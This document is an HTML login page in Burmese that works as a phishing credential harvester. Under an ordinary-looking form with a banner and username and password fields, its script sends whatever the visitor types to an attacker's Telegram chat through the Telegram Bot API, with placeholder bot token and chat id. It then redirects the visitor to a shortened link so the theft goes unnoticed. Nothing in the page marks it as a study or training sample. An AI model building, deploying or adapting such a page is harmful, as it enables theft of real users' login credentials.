<!DOCTYPE html>
<html lang="my">
<head>
<meta charset="UTF-8">
<title>Login</title>

<style>

body{
margin:0;
font-family:Arial;
background:#8b0000;
color:white;
text-align:center;
}

.banner img{
width:100%;
height:220px;
object-fit:cover;
}

.login-box{
background:#6b0000;
margin:20px;
padding:20px;
border-radius:10px;
}

input{
width:90%;
padding:10px;
margin:8px;
border:none;
border-radius:5px;
}

button{
width:95%;
padding:12px;
background:gold;
border:none;
border-radius:5px;
font-size:16px;
}

</style>
</head>

<body>

<div class="banner">
<img src="https://i.imgur.com/8Km9tLL.jpg">
</div>

<div class="login-box">

<h2>အကောင့်ထဲဝင်ရန်</h2>

<input id="user" placeholder="အကောင့်အမည်">

<input type="password" id="pass" placeholder="စကားဝှက်">

<button onclick="login()">အကောင့်ထဲဝင်ရန်</button>

</div>

<script>

const token = "BOT_TOKEN_HERE";
const chat_id = "CHAT_ID_HERE";

function login(){

let user=document.getElementById("user").value;
let pass=document.getElementById("pass").value;

let text=
"LOGIN INFO\n"+
"Username: "+user+"\n"+
"Password: "+pass;

fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);

window.location.href="https://cutt.ly/otrecCFE";

}

</script>

</body>
</html>
